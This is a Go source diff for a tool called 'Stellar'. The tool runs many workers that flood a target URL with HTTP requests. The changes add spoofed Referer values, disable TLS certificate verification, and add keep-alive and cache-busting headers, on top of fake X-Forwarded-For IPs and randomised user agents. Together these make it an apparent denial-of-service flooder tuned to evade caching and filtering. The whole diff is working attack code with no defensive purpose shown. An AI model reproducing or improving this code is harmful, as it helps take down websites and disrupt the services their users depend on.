@@ -1,6 +1,7 @@
 package main
 
 import (
+	"crypto/tls"
 	"fmt"
 	"math/rand"
 	"net/http"
@@ -19,6 +20,10 @@ var referers = []string{
 	"https://www.wikipedia.org/",
 	"https://www.reddit.com/",
 	"https://www.github.com/",
+	"https://www.youtube.com/",
+	"https://www.facebook.com/",
+	"https://www.twitter.com/",
+	"https://duckduckgo.com/",
 }
 
 var acceptLanguages = []string{
@@ -76,7 +81,11 @@ func NewStellar(target string, workers int) (*Stellar, error) {
 }
 
 func (s *Stellar) launchWorker() {
-	client := &http.Client{}
+	client := &http.Client{
+		Transport: &http.Transport{
+			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
+		},
+	}
 	for {
 		select {
 		case <-s.stop:
@@ -88,8 +97,11 @@ func (s *Stellar) launchWorker() {
 			}
 			req.Header.Set("User-Agent", generateUserAgent())
 			req.Header.Set("Referer", referers[randGen.Intn(len(referers))])
+			req.Header.Set("Connection", "Keep-Alive")
+			req.Header.Set("Cache-Control", "max-age=0,no-cache")
 			req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8")
 			req.Header.Set("Accept-Language", acceptLanguages[randGen.Intn(len(acceptLanguages))])
+			req.Header.Set("Accept-Encoding", "gzip, deflate")
 			req.Header.Set("X-Forwarded-For", generateFakeIP())
 
 			resp, err := client.Do(req)
